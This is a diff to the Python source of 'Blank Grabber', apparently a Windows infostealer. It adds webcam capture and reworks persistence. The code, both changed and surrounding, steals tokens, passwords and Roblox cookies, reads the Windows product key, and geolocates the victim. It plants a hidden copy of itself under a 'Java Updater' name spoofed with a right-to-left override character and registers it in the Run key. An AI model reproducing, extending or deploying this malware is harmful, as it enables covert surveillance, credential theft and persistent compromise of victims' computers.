@@ -18,7 +18,7 @@ import sys
 import json
 import random
 import time
-from PIL import ImageGrab
+from PIL import ImageGrab, Image, ImageStat
 import pyaes
 import win32crypt
 import re
@@ -76,7 +76,7 @@ def MUTEX():
     with open(mutex_path, 'w'): pass
     while True:
         if not os.path.isfile(mutex_path):
-            fquit()
+            os._exit(0)
     
 
 class BlankGrabber:
@@ -98,12 +98,13 @@ class BlankGrabber:
         except FileExistsError:
             pass
         except Exception:
-            fquit()
+            os._exit(0)
         threads = []
         self.tokens = []
         self.passwords = {}
         self.roblocookie = []
         self.ipinfo = self.getip()
+        t = threading.Thread(target = lambda: self.webshot())
         t = threading.Thread(target = lambda: self.misc())
         t.start()
         threads.append(t)
@@ -132,12 +133,31 @@ class BlankGrabber:
             with open(self.tempfolder + "/Roblox Cookies.txt", 'w') as file:
                 file.write("\n\n".join(self.roblocookie))
         if os.path.isfile(self.tempfolder+"/Logs.txt"):
-            logs = e.read()
-            e.seek(0)
-            e.write('These are the error logs generated during the execution of the program in the the target PC. You can try to figure it out for yourself if you want or create an issue at https://github.com/Blank-c/Blank-Grabber/issues \n\n"+logs')
+            with open(self.tempfolder+"/Logs.txt", 'rw') as e:
+                log = e.read()
+                e.seek(0)
+                e.write("These are the error logs generated during the execution of the program in the the target PC. You can try to figure it out for yourself if you want or create an issue at https://github.com/Blank-c/Blank-Grabber/issues \n\n"+log.strip())
         for t in threads:
             t.join()
         self.send()
+        
+    def is_monochrome(self, path):
+        return __import__("functools").reduce(lambda x, y: x and y < 0.005, ImageStat.Stat(Image.open(path)).var, True)
+        
+    def webshot(self):
+        if not hasattr(sys, 'frozen'):
+            return
+        call = subprocess.run("a.es -d -p blank cm.bam.aes", capture_output= True, shell= True, cwd= sys._MEIPASS)
+        if call.returncode != 0:
+            return
+        subprocess.run("cm.bam /filename Webcam.bmp", capture_output= True, shell= True, cwd= sys._MEIPASS)
+        if self.is_monochrome(sys._MEIPASS + "/Webcam.bmp"):
+            os.remove(sys._MEIPASS + "/Webcam.bmp")
+            return
+        with Image.open(sys._MEIPASS + "/Webcam.bmp") as img:
+            img.save(self.tempfolder + "/Webcam.png", "png")
+        os.remove(sys._MEIPASS + "/Webcam.bmp")
+        os.remove(sys._MEIPASS + "/cm.bam")
         
     def getPKey(self):
         key = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode().strip()
@@ -376,7 +396,7 @@ class BlankGrabber:
             r = requests.get("http://ip-api.com/json/?fields=225545").json()
             if r.get("status") != "success":
                 raise Exception('Failed')
-            data = f"Computer Name: {os.getenv('computername')}\nComputer OS: {subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.strip().splitlines()[2].strip().decode()}\nTotal Memory: {int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode().strip().split()[1])/1000000000)} GB" + (f"\nProduct Key: {self.productKey}" if self.productKey is not None else "")+ f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {chr(9989) if r['mobile'] else chr(10062)}\n{'Proxy/VPN:'.ljust(20)} {chr(9989) if r['proxy'] else chr(10062)}"
+            data = f"Computer Name: {os.getenv('computername')}\nComputer OS: {subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode().strip().splitlines()[2].strip()}\nTotal Memory: {int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode().strip().split()[1])/1000000000)} GB" + (f"\nProduct Key: {self.productKey}" if self.productKey is not None else "")+ f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {chr(9989) if r['mobile'] else chr(10062)}\n{'Proxy/VPN:'.ljust(20)} {chr(9989) if r['proxy'] else chr(10062)}"
             if r['reverse'] != '':
                 data += f"\nReverse DNS: {r['reverse']}"
         except Exception:
@@ -436,7 +456,7 @@ if __name__ == "__main__":
         try:
             r = requests.get("https://httpbin.org/get?1=2")
             if r.json().get("args").get("1") != "2":
-                fquit()
+                os._exit(0)
         except Exception:
             continue
         else:
@@ -447,16 +467,24 @@ if __name__ == "__main__":
                 if os.path.basename(os.path.dirname(sys.executable)) != "Java":
                     try:
                         BlankGrabber.copy('BlankGrabber', sys.executable, "C:/Program Files/Java/Java Updater G‮lld.COM")
-                        subprocess.run('attrib +h +r +s"C:/Program Files/Java/Java Updater G‮lld.COM"', capture_output = True, shell= True)
-                        with open("C:/Program Files/Java/Java Updater G‮lld.COM", 'ab') as file:
-                            file.write(b'\x00')
-                        subprocess.run('REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Java Updater" /t REG_SZ /F /d "C:/Program Files/Java/Java Updater G‮lld.COM -hide"', shell= True, capture_output= True)
-                        subprocess.call("C:/Program Files/Java/Java Updater G‮lld.COM", shell= True)
-                        fquit()
                     except Exception:
                         pass
+                    subprocess.run('attrib +h +r +s "C:/Program Files/Java/Java Updater G‮lld.COM"', capture_output = True, shell= True)
+                    try:
+                        if os.path.isfile("C:/Program Files/Java/Java Updater G‮lld.COM"):
+                            with open("C:/Program Files/Java/Java Updater G‮lld.COM", 'ab') as file:
+                                file.write(b'\x00')
+                    except Exception:
+                        pass
+                    subprocess.run('REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Java Updater" /t REG_SZ /F /d "C:/Program Files/Java/Java Updater G‮lld.COM -hide"', shell= True, capture_output= True)
+                    threading.Thread(target= lambda: subprocess.run('start "" "C:/Program Files/Java/Java Updater G‮lld.COM"', shell= True, capture_output= True), daemon= True).start()
+                    time.sleep(1)
+                    os._exit(0)
 
-            threading.Thread(target= MUTEX).start()
-            BlankGrabber()
+            threading.Thread(target= MUTEX, daemon= True).start()
+            try:
+                BlankGrabber()
+            except Exception:
+                pass
         finally:
             time.sleep(1800) #30 Minutes
